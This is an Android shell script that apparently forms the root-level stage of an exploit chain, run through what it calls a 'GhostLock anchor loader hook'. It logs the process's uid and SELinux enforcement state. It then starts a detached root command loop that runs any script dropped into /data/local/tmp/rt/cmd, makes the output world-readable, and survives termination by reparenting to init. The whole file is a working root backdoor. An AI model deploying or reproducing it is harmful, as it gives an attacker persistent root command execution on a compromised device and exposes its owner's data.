#!/system/bin/sh
# Runs as uid 0 (init_cred + permissive) via the GhostLock anchor loader hook.
# Leaves a persistent uid-0 command loop the host shell can drive.
D=/data/local/tmp/rt
{
  echo "loader-entry uid=$(id -u) euid=$(id -u) gid=$(id -g) $(date)"
  echo "selinux=$(cat /sys/fs/selinux/enforce 2>/dev/null)"
} > "$D/loader.status" 2>&1

# Detached root command loop: host writes $D/cmd, root executes it, output in
# $D/out. Survives the anchor's SIGKILL because it is reparented to init.
(
  while :; do
    if [ -s "$D/cmd" ]; then
      mv "$D/cmd" "$D/cmd.run" 2>/dev/null
      if [ -s "$D/cmd.run" ]; then
        /system/bin/sh "$D/cmd.run" > "$D/out" 2>&1
        rc=$?
        printf '\n__RC=%s__\n' "$rc" >> "$D/out"
      fi
      rm -f "$D/cmd.run"
    fi
    sleep 1
  done
) </dev/null >/dev/null 2>&1 &

echo "loop-pid=$!" >> "$D/loader.status"
chmod 0666 "$D/out" "$D/loader.status" 2>/dev/null
exit 0
